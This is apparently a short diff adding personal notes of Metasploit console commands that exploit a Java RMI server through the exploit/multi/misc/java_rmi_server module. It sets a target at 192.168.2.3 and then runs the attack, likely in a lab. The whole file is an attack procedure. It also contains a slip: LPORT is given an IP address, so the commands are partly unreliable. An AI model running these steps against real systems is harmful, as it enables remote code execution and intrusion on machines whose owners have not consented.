@@ -1,0 +1,11 @@
+search java rmi
+use 3
+
+or 
+
+use exploit/multi/misc/java_rmi_server
+
+set RHOST 192.168.2.3
+set LPORT 192.168.2.4
+
+run
